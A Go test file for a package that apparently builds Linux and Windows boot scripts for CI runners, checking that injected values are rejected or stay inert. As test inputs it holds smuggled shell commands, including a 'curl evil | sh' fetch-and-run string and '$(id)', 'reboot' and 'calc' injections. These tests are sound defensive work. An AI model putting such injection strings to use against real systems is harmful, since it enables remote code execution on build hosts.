package bootscript

import (
	"context"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/wizenheimer/airship/apps/api/internal/cloud"
)

func testBoot() cloud.Boot {
	return cloud.Boot{JITConfig: "ZXlKaGJHY2lPaUpJVXpJMU5pSjk=", RunnerVersion: "2.338.2", MaxLifetimeSeconds: 3600}
}

func TestLinuxRejectsInjection(t *testing.T) {
	t.Parallel()
	for name, mutate := range map[string]func(*cloud.Boot) string{
		"jit":     func(b *cloud.Boot) string { b.JITConfig = "abc'; curl evil | sh; '"; return "x64" },
		"version": func(b *cloud.Boot) string { b.RunnerVersion = "2.338.2; reboot"; return "x64" },
		"arch":    func(*cloud.Boot) string { return "x64$(id)" },
	} {
		boot := testBoot()
		arch := mutate(&boot)
		if _, err := Linux(boot, arch); err == nil {
			t.Errorf("%s: unsafe value accepted into the boot script", name)
		}
	}
	boot := testBoot()
	boot.JITConfig = strings.Repeat("A", 4000) // real configs are ~2-3 KB
	if _, err := Linux(boot, "x64"); err != nil {
		t.Fatalf("realistic jit config rejected: %v", err)
	}
}

// Job variables reach the runner's .env byte for byte, and nothing in
// them is ever evaluated by the boot script's shell.
func TestLinuxEnvIsInert(t *testing.T) {
	t.Parallel()
	boot := testBoot()
	boot.Env = map[string]string{"GREETING": "hello world", "TRICKY": `$(touch pwned)'"` + "`id`"}
	script, err := Linux(boot, "x64")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(script, "pwned") {
		t.Fatal("a variable's value appears in the script as text")
	}

	// Run the script's .env line for real against a scratch directory.
	var line string
	for l := range strings.SplitSeq(script, "\n") {
		if strings.Contains(l, "/.env") {
			line = l
		}
	}
	dir := t.TempDir()
	cmd := exec.CommandContext(context.Background(), "bash", "-c", "set -euo pipefail; RUNNER_DIR=.; "+line)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%s: %v: %s", line, err, out)
	}
	got, err := os.ReadFile(filepath.Join(dir, ".env"))
	if err != nil {
		t.Fatal(err)
	}
	if want := "GREETING=hello world\nTRICKY=" + boot.Env["TRICKY"] + "\n"; string(got) != want {
		t.Fatalf(".env = %q, want %q", got, want)
	}
	if _, err := os.Stat(filepath.Join(dir, "pwned")); err == nil {
		t.Fatal("a variable's value was executed")
	}
	if out, err := exec.CommandContext(context.Background(), "bash", "-n", "-c", script).CombinedOutput(); err != nil {
		t.Fatalf("boot script does not parse: %v: %s", err, out)
	}

	for _, bad := range []map[string]string{{"RUNNER_TOKEN": "x"}, {"OK": "a\nb"}, {"1BAD": "x"}} {
		boot.Env = bad
		if _, err := Linux(boot, "x64"); err == nil {
			t.Errorf("env %v accepted", bad)
		}
	}
}

func TestLinuxGPU(t *testing.T) {
	t.Parallel()
	boot := testBoot()
	boot.GPU = true
	script, err := Linux(boot, "x64")
	if err != nil || !strings.Contains(script, "ubuntu-drivers") {
		t.Fatalf("gpu script = %v: %s", err, script)
	}
	boot.GPU = false
	if script, _ := Linux(boot, "x64"); strings.Contains(script, "ubuntu-drivers") {
		t.Fatal("driver install present without gpu")
	}
}

func TestWindows(t *testing.T) {
	t.Parallel()
	boot := testBoot()
	boot.Env = map[string]string{"A": "b"}
	script, err := Windows(boot, "x64", "")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(script, "<powershell>") || !strings.Contains(script, `actions-runner-win-x64-2.338.2.zip`) {
		t.Fatalf("script = %s", script)
	}
	if !strings.Contains(script, base64.StdEncoding.EncodeToString([]byte("A=b\n"))) || strings.Contains(script, "AutoAdminLogon") {
		t.Fatal("env missing or interactive logon present")
	}

	boot.Windows = cloud.Windows{Interactive: true, Path: `C:\r`}
	script, err = Windows(boot, "x64", "Abcdefghij1234567890")
	if err != nil || !strings.Contains(script, "AutoAdminLogon") || !strings.Contains(script, `$dir = "C:\r"`) {
		t.Fatalf("interactive = %v: %s", err, script)
	}
	for name, mutate := range map[string]func(*cloud.Boot) string{
		"path":     func(b *cloud.Boot) string { b.Windows.Path = `C:\r"; calc; "`; return "ok" },
		"user":     func(b *cloud.Boot) string { b.Windows.User = `a"b`; return "ok" },
		"password": func(*cloud.Boot) string { return `x"y` },
	} {
		b := testBoot()
		b.Windows.Interactive = true
		password := mutate(&b)
		if password == "ok" {
			password = "Abcdefghij1234567890"
		}
		if _, err := Windows(b, "x64", password); err == nil {
			t.Errorf("%s: unsafe value accepted", name)
		}
	}
}
